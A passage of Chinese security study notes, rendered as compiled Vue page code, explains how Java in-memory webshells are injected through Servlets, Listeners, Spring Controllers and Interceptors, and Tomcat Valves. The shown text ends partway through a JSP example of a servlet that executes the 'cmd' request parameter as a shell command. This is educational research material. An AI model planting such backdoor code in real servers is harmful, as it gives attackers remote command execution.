的？这个过程简单一点，只有两部走：</p><ul><li>ApplicationServletRegistration 的 <code>addMapping</code> 方法调用 <code>StandardContext#addServletMapping</code> 方法，在 mapper 中添加 URL 路径与 Wrapper 对象的映射（Wrapper 通过 this.children 中根据 name 获取）</li><li>同时在 servletMappings 中添加 URL 路径与 name 的映射。</li></ul><p>这里直接调用相关方法进行添加，当然是用反射直接写入也可以，有一些逻辑较为复杂。</p><p>测试代码在 <a href="https://github.com/su18/MemoryShell/blob/main/memshell-test/memshell-test-tomcat/src/org/su18/memshell/test/tomcat/AddTomcatServlet.java" target="_blank" rel="noopener noreferrer">org.su18.memshell.web.servlet.AddTomcatServlet</a> 中，访问这个 servlet 会在程序中生成一个新的 Servlet :<code>/su18</code></p>',11)),e("p",null,[i[4]||(i[4]=s("具体示例及实现部分可以在本文同级目录下的 ")),a(t,{to:"/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/Web%E5%AE%89%E5%85%A8/%E6%BC%8F%E6%B4%9E%E7%B1%BB%E5%9E%8B/%E5%86%85%E5%AD%98%E9%A9%AC/Java%E5%86%85%E5%AD%98%E9%A9%AC/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC/Servlet%E5%86%85%E5%AD%98%E9%A9%AC/servletContext-addServlet.html"},{default:l(()=>i[3]||(i[3]=[s("Tomcat内存马/Servlet内存马/servletContext-addServlet")])),_:1}),i[5]||(i[5]=s(" 中查看"))]),i[22]||(i[22]=n('<hr><h3 id="listener内存马" tabindex="-1"><a class="header-anchor" href="#listener内存马"><span>Listener内存马</span></a></h3><blockquote><p><a href="https://su18.org/post/memory-shell/#listener-%E5%86%85%E5%AD%98%E9%A9%AC" target="_blank" rel="noopener noreferrer">JavaWeb 内存马一周目通关攻略 | 素十八 (su18.org)</a></p></blockquote><p>Servlet 和 Filter 相对于 Listener 更常用, 因此更容易找到内存马注入的相关材料, 而 Listener 相对而言就冷门了一些</p><p>Listener(监听器)用于监听对象/流程的创建与销毁，通过 Listener 可以自动触发一些操作，因此依靠它也可以完成内存马的实现。</p><p>先来了解一下 Listener 是干什么的，看一下 Servlet API 中的注释。</p><p><img src="http://cdn.ayusummer233.top/DailyNotes/202409301705658.png" alt="image-20240930170541398"></p><p>在应用中可能调用的监听器如下：</p><ul><li>ServletContextListener：用于监听整个 Servlet 上下文（创建、销毁）</li><li>ServletContextAttributeListener：对 Servlet 上下文属性进行监听（增删改属性）</li><li>ServletRequestListener：对 Request 请求进行监听（创建、销毁）</li><li>ServletRequestAttributeListener：对 Request 属性进行监听（增删改属性）</li><li>javax.servlet.http.HttpSessionListener：对 Session 整体状态的监听</li><li>javax.servlet.http.HttpSessionAttributeListener：对 Session 属性的监听</li></ul><p>可以看到 Listener 也是为一次访问的请求或生命周期进行服务的，在上述每个不同的接口中，都提供了不同的方法，用来在监听的对象发生改变时进行触发。而这些类接口，实际上都是 <code>java.util.EventListener</code> 的子接口。</p><p>这里我们看到，在<code> ServletRequestListener</code> 接口中，提供了两个方法在 request 请求创建和销毁时进行处理，比较适合我们用来做内存马。</p><p><img src="http://cdn.ayusummer233.top/DailyNotes/202410071915963.png" alt="image-20241007191534811"></p><blockquote><p>除了这个 Listener，其他的 Listener 在某些情况下也可以触发作为内存马的实现，<a href="https://su18.org/post/memory-shell/#listener-%E5%86%85%E5%AD%98%E9%A9%AC" target="_blank" rel="noopener noreferrer">原文</a>里没有对每个都进行触发测试，感兴趣的师傅可以自测。</p><hr><p>PS: 这里沿着原文作者的思路梳理 Listener 内存马原理, 也暂且不会对其他 Listener 做单独测试</p></blockquote><p>ServletRequestListener 提供两个方法：<code>requestInitialized</code> 和 <code>requestDestroyed</code>，两个方法均接收 ServletRequestEvent 作为参数，ServletRequestEvent 中又储存了 ServletContext 对象和 ServletRequest 对象，因此在访问请求过程中我们可以在 request 创建和销毁时实现自己的恶意代码，完成内存马的实现。</p><p><img src="http://cdn.ayusummer233.top/DailyNotes/202410081826508.png" alt="image-20241008182622322"></p><p><img src="http://cdn.ayusummer233.top/DailyNotes/202410081826652.png" alt="image-20241008182652523"></p><p>Tomcat 中 EventListeners 存放在 StandardContext 的 applicationEventListenersObjects 属性中，同样可以使用 StandardContext 的相关 add 方法添加。</p><p><img src="http://cdn.ayusummer233.top/DailyNotes/202410091412648.png" alt="image-20241009141200546"></p>',18)),e("p",null,[i[7]||(i[7]=s("具体示例可参阅 ")),a(t,{to:"/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/Web%E5%AE%89%E5%85%A8/%E6%BC%8F%E6%B4%9E%E7%B1%BB%E5%9E%8B/%E5%86%85%E5%AD%98%E9%A9%AC/Java%E5%86%85%E5%AD%98%E9%A9%AC/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC/Listener%E5%86%85%E5%AD%98%E9%A9%AC/"},{default:l(()=>i[6]||(i[6]=[s("Tomcat内存马/Listener内存马")])),_:1})]),i[23]||(i[23]=n('<hr><h3 id="总结" tabindex="-1"><a class="header-anchor" href="#总结"><span>总结</span></a></h3><p>总的来说, Servlet API 中提供的能够利用实现内存马的一些点大致如下:</p><ul><li>Servlet: 在用户请求路径与处理类映射之处，添加一个指定路径的指定处理类</li><li>Filter: 在用户处理类之前的，用来对请求进行额外处理提供额外功能的类</li><li>Listener: 在 Filter 之外的监听进程</li></ul><p>除了 Servlet API ，在常用的框架、组件、中间件的实现中，只要采用了类似的设计思想和设计模式的位置，都可以、逐渐或正在被发掘出来做为内存马的相关实现。</p><hr><h2 id="控制器-拦截器-管道" tabindex="-1"><a class="header-anchor" href="#控制器-拦截器-管道"><span>控制器,拦截器,管道</span></a></h2><blockquote><p><a href="https://su18.org/post/memory-shell/#%E6%8E%A7%E5%88%B6%E5%99%A8-%E6%8B%A6%E6%88%AA%E5%99%A8-%E7%AE%A1%E9%81%93" target="_blank" rel="noopener noreferrer">JavaWeb 内存马一周目通关攻略 | 素十八 (su18.org)</a></p></blockquote><hr><h3 id="spring-controller-内存马" tabindex="-1"><a class="header-anchor" href="#spring-controller-内存马"><span>Spring Controller 内存马</span></a></h3><p>在动态注册 Servlet 时，注册了两个东西，一个是 Servlet 的本身实现，一个 Servlet 与 URL 的映射 Servlet-Mapping</p><p>在注册 Controller 时，也同样需要注册两个东西，一个是 Controller，一个是 RequestMapping 映射。这里使用 spring-webmvc-5.2.3 进行调试。</p>',12)),e("p",null,[i[9]||(i[9]=s("详情请转到 ")),a(t,{to:"/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/Web%E5%AE%89%E5%85%A8/%E6%BC%8F%E6%B4%9E%E7%B1%BB%E5%9E%8B/%E5%86%85%E5%AD%98%E9%A9%AC/Java%E5%86%85%E5%AD%98%E9%A9%AC/SpringMVC/"},{default:l(()=>i[8]||(i[8]=[s("Spring Controller内存马")])),_:1}),i[10]||(i[10]=s(" 查阅"))]),i[24]||(i[24]=e("hr",null,null,-1)),i[25]||(i[25]=e("h3",{id:"spring-interceptor-内存马",tabindex:"-1"},[e("a",{class:"header-anchor",href:"#spring-interceptor-内存马"},[e("span",null,"Spring Interceptor 内存马")])],-1)),e("p",null,[i[12]||(i[12]=s("这里的 Intercepor 是指 Spring 中的拦截器，它是 Spring 使用 AOP 对 Filter 思想的令一种实现，在其他框架如 Struts2 中也有拦截器思想的相关实现。不过这里将仅仅使用 Spring 中的拦截器进行研究。Intercepor 主要是针对 Controller 进行拦截。也可以做内存马注入, 详情请转到 ")),a(t,{to:"/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/Web%E5%AE%89%E5%85%A8/%E6%BC%8F%E6%B4%9E%E7%B1%BB%E5%9E%8B/%E5%86%85%E5%AD%98%E9%A9%AC/Java%E5%86%85%E5%AD%98%E9%A9%AC/SpringMVC/Interceptor/"},{default:l(()=>i[11]||(i[11]=[s("Spring Interceptor 内存马")])),_:1}),i[13]||(i[13]=s(" 查阅"))]),i[26]||(i[26]=e("hr",null,null,-1)),i[27]||(i[27]=e("h3",{id:"tomcat-valve内存马",tabindex:"-1"},[e("a",{class:"header-anchor",href:"#tomcat-valve内存马"},[e("span",null,"Tomcat Valve内存马")])],-1)),i[28]||(i[28]=e("p",null,"为了整体架构的每个组件的可伸缩性和可扩展性，Tomcat 使用了职责链模式来实现客户端请求的处理。在 Tomcat 中定义了两个接口：Pipeline（管道）和 Valve（阀）",-1)),i[29]||(i[29]=e("p",null,[s("Pipeline 中会有一个最基础的 Valve（basic），它始终位于末端（最后执行），封装了具体的请求处理和输出响应的过程。Pipeline 提供了 "),e("code",null,"addValve"),s(" 方法，可以添加新 Valve 在 basic 之前，并按照添加顺序执行。")],-1)),e("p",null,[i[15]||(i[15]=s("这里的 Valve 也可以做内存马注入, 具体见 ")),a(t,{to:"/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/Web%E5%AE%89%E5%85%A8/%E6%BC%8F%E6%B4%9E%E7%B1%BB%E5%9E%8B/%E5%86%85%E5%AD%98%E9%A9%AC/Java%E5%86%85%E5%AD%98%E9%A9%AC/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC/Valve%E5%86%85%E5%AD%98%E9%A9%AC/"},{default:l(()=>i[14]||(i[14]=[s("Tomcat Valve 内存马")])),_:1})]),i[30]||(i[30]=n('<hr><hr><h2 id="示例-tomcat-servletapi型内存马" tabindex="-1"><a class="header-anchor" href="#示例-tomcat-servletapi型内存马"><span>示例 -Tomcat-ServletAPI型内存马</span></a></h2><blockquote><p><a href="https://www.freebuf.com/articles/web/274466.html" target="_blank" rel="noopener noreferrer">一文看懂内存马 - FreeBuf网络安全行业门户</a></p><p><a href="https://www.freebuf.com/articles/web/172753.html" target="_blank" rel="noopener noreferrer">利用“进程注入”实现无文件复活 WebShell - FreeBuf网络安全行业门户</a></p></blockquote><hr><h3 id="环境配置" tabindex="-1"><a class="header-anchor" href="#环境配置"><span>环境配置</span></a></h3>',6)),e("p",null,[a(t,{to:"/Language/Java/JavaWeb.html#tomcat%E5%AE%89%E8%A3%85"},{default:l(()=>i[16]||(i[16]=[s("安装Tomcat")])),_:1}),i[18]||(i[18]=s(" -> ")),a(t,{to:"/Language/Java/JavaWeb.html#tomcat%E9%85%8D%E7%BD%AE"},{default:l(()=>i[17]||(i[17]=[s("配置Tomcat")])),_:1})]),i[31]||(i[31]=n(`<hr><h3 id="编写与部署servletapi型内存马" tabindex="-1"><a class="header-anchor" href="#编写与部署servletapi型内存马"><span>编写与部署ServletAPI型内存马</span></a></h3><p>在 Tomcat 的 <code>webapps</code> 目录下, 常见一个新的子目录, 例如 <code>java-memshell-tomcat-servletapi</code></p><p>Tomcat 会自动部署这个应用, 可以通过 <code>http://localhost:8080/java-memshell-tomcat-servletapi</code> 访问此应用</p><p><img src="http://cdn.ayusummer233.top/DailyNotes/202409111437463.png" alt="image-20240911143708373"></p><hr><p>下面的代码先是创建了一个恶意的servlet，然后获取当前的StandardContext，然后将恶意servlet封装成wrapper添加到StandardContext的children当中，最后添加ServletMapping将访问的URL和wrapper进行绑定。</p><div class="language-java line-numbers-mode" data-highlighter="shiki" data-ext="java" data-title="java" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">&lt;%</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">@</span><span style="--shiki-light:#A626A4;--shiki-dark:#E5C07B;"> page</span><span style="--shiki-light:#383A42;--shiki-dark:#E06C75;"> contentType</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">=</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">&quot;text/html; charset=UTF-8&quot;</span><span style="--shiki-light:#383A42;--shiki-dark:#E06C75;"> pageEncoding</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">=</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">&quot;UTF-8&quot;</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">%&gt;</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">&lt;%</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">@</span><span style="--shiki-light:#A626A4;--shiki-dark:#E5C07B;"> page</span><span style="--shiki-light:#383A42;--shiki-dark:#E06C75;"> import</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">=</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">&quot;java.io.IOException&quot;</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;"> %&gt;</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">&lt;%</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">@</span><span style="--shiki-light:#A626A4;--shiki-dark:#E5C07B;"> page</span><span style="--shiki-light:#383A42;--shiki-dark:#E06C75;"> import</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">=</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">&quot;java.io.InputStream&quot;</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;"> %&gt;</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">&lt;%</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">@</span><span style="--shiki-light:#A626A4;--shiki-dark:#E5C07B;"> page</span><span style="--shiki-light:#383A42;--shiki-dark:#E06C75;"> import</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">=</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">&quot;java.util.Scanner&quot;</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;"> %&gt;</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">&lt;%</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">@</span><span style="--shiki-light:#A626A4;--shiki-dark:#E5C07B;"> page</span><span style="--shiki-light:#383A42;--shiki-dark:#E06C75;"> import</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">=</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">&quot;org.apache.catalina.core.StandardContext&quot;</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;"> %&gt;</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">&lt;%</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">@</span><span style="--shiki-light:#A626A4;--shiki-dark:#E5C07B;"> page</span><span style="--shiki-light:#383A42;--shiki-dark:#E06C75;"> import</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">=</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">&quot;java.io.PrintWriter&quot;</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;"> %&gt;</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">&lt;%</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">@</span><span style="--shiki-light:#A626A4;--shiki-dark:#E5C07B;"> page</span><span style="--shiki-light:#383A42;--shiki-dark:#E06C75;"> import</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">=</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">&quot;javax.servlet.Servlet&quot;</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;"> %&gt;</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">&lt;%</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">@</span><span style="--shiki-light:#A626A4;--shiki-dark:#E5C07B;"> page</span><span style="--shiki-light:#383A42;--shiki-dark:#E06C75;"> import</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">=</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">&quot;javax.servlet.ServletConfig&quot;</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;"> %&gt;</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">&lt;%</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">@</span><span style="--shiki-light:#A626A4;--shiki-dark:#E5C07B;"> page</span><span style="--shiki-light:#383A42;--shiki-dark:#E06C75;"> import</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">=</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">&quot;javax.servlet.ServletRequest&quot;</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;"> %&gt;</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">&lt;%</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">@</span><span style="--shiki-light:#A626A4;--shiki-dark:#E5C07B;"> page</span><span style="--shiki-light:#383A42;--shiki-dark:#E06C75;"> import</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">=</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">&quot;javax.servlet.ServletResponse&quot;</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;"> %&gt;</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">&lt;%</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">@</span><span style="--shiki-light:#A626A4;--shiki-dark:#E5C07B;"> page</span><span style="--shiki-light:#383A42;--shiki-dark:#E06C75;"> import</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">=</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">&quot;javax.servlet.ServletException&quot;</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;"> %&gt;</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">&lt;%</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">@</span><span style="--shiki-light:#A626A4;--shiki-dark:#E5C07B;"> page</span><span style="--shiki-light:#383A42;--shiki-dark:#E06C75;"> import</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">=</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">&quot;org.apache.catalina.Wrapper&quot;</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;"> %&gt;</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">&lt;%</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">@</span><span style="--shiki-light:#A626A4;--shiki-dark:#E5C07B;"> page</span><span style="--shiki-light:#383A42;--shiki-dark:#E06C75;"> import</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">=</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">&quot;java.lang.reflect.Field&quot;</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;"> %&gt;</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">&lt;%</span></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic;">    // 创建恶意Servlet</span></span>
<span class="line"><span style="--shiki-light:#C18401;--shiki-dark:#E5C07B;">    Servlet</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75;"> servlet </span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">=</span><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;"> new</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;"> Servlet</span><span style="--shiki-light:#383A42;--shiki-dark:#E06C75;">() {</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">        @</span><span style="--shiki-light:#A626A4;--shiki-dark:#E5C07B;">Override</span></span>
<span class="line"><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;">        public</span><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;"> void</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;"> init</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">(</span><span style="--shiki-light:#C18401;--shiki-dark:#E5C07B;">ServletConfig</span><span style="--shiki-light:#383A42;--shiki-light-font-style:inherit;--shiki-dark:#E06C75;--shiki-dark-font-style:italic;"> servletConfig</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">)</span><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;"> throws</span><span style="--shiki-light:#C18401;--shiki-dark:#E5C07B;"> ServletException</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;"> {</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">        }</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">        @</span><span style="--shiki-light:#A626A4;--shiki-dark:#E5C07B;">Override</span></span>
<span class="line"><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;">        public</span><span style="--shiki-light:#C18401;--shiki-dark:#E5C07B;"> ServletConfig</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;"> getServletConfig</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">()</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;"> {</span></span>
<span class="line"><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;">            return</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;"> null</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">;</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">        }</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">        @</span><span style="--shiki-light:#A626A4;--shiki-dark:#E5C07B;">Override</span></span>
<span class="line"><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;">        public</span><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;"> void</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;"> service</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">(</span><span style="--shiki-light:#C18401;--shiki-dark:#E5C07B;">ServletRequest</span><span style="--shiki-light:#383A42;--shiki-light-font-style:inherit;--shiki-dark:#E06C75;--shiki-dark-font-style:italic;"> servletRequest</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">, </span><span style="--shiki-light:#C18401;--shiki-dark:#E5C07B;">ServletResponse</span><span style="--shiki-light:#383A42;--shiki-light-font-style:inherit;--shiki-dark:#E06C75;--shiki-dark-font-style:italic;"> servletResponse</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">)</span><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;"> throws</span><span style="--shiki-light:#C18401;--shiki-dark:#E5C07B;"> ServletException</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">,</span><span style="--shiki-light:#C18401;--shiki-dark:#E5C07B;"> IOException</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;"> {</span></span>
<span class="line"><span style="--shiki-light:#C18401;--shiki-dark:#E5C07B;">            String</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75;"> cmd</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;"> =</span><span style="--shiki-light:#E45649;--shiki-dark:#E5C07B;"> servletRequest</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">.</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">getParameter</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">(</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">&quot;cmd&quot;</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">);</span></span>
<span class="line"><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;">            boolean</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75;"> isLinux</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;"> =</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;"> true</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">;</span></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic;">            // 下面这行中的 System 语句在 Linux Docker 容器中会报错, 编译都过不了，在Windows上可以正常解析</span></span>
<span class="line"><span style="--shiki-light:#C18401;--shiki-dark:#E5C07B;">            String</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75;"> osTyp</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;"> =</span><span style="--shiki-light:#E45649;--shiki-dark:#E5C07B;"> System</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">.</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">getProperty</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">(</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">&quot;os.name&quot;</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">);</span></span>
<span class="line"><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;">            if</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;"> (osTyp </span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">!=</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;"> null</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;"> &amp;&amp;</span><span style="--shiki-light:#E45649;--shiki-dark:#E5C07B;"> osTyp</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">.</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">toLowerCase</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">().</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">contains</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">(</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">&quot;win&quot;</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">)) {</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">                isLinux </span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">=</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;"> false</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">;</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">            }</span></span>
<span class="line"><span style="--shiki-light:#C18401;--shiki-dark:#E5C07B;">            String</span><span style="--shiki-light:#E45649;--shiki-dark:#ABB2BF;">[] </span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75;">cmds</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;"> =</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;"> isLinux </span><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;">?</span><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;"> new</span><span style="--shiki-light:#C18401;--shiki-dark:#E5C07B;"> String</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">[]{</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">&quot;sh&quot;</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">, </span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">&quot;-c&quot;</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">, cmd} </span><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;">:</span><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;"> new</span><span style="--shiki-light:#C18401;--shiki-dark:#E5C07B;"> String</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">[]{</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">&quot;cmd.exe&quot;</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">, </span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">&quot;/c&quot;</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">, cmd};</span></span>
<span class="line"><span style="--shiki-light:#C18401;--shiki-dark:#E5C07B;">            InputStream</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75;"> in</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;"> =</span><span style="--shiki-light:#E45649;--shiki-dark:#E5C07B;"> Runtime</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">.</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">getRuntime</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">().</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">exec</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">(cmds).</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">getInputStream</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">();</span></span>
<span class="line"><span style="--shiki-light:#C18401;--shiki-dark:#E5C07B;">            Scanner</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75;"> s</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;"> =</span><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;"> new</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;"> Scanner</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">(in).</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">useDelimiter</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">(</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">&quot;</span><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2;">\\\\</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">a&quot;</span><span 